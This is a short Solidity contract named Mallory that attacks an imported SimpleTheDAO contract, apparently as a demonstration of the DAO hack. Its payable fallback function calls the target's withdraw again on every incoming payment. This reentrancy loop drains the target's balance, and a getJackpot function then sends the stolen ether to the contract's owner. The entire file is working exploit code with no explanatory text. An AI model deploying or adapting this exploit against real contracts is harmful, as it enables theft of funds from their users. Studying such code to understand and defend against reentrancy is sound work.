pragma solidity 0.4.15;
import './SimpleTheDAO.sol';

contract Mallory {
  SimpleTheDAO public dao;
  address owner;
  event LogAddress(address addr);
  event LogNumber(uint balance);

  function Mallory(SimpleTheDAO addr){
    owner = msg.sender;
    dao = addr;
  }

  function getJackpot() {
    LogAddress(owner);
    LogNumber(this.balance);
    bool res = owner.send(this.balance);
    LogNumber(this.balance);
  }

  function() payable {
    dao.withdraw(dao.queryCredit(this));
  }
}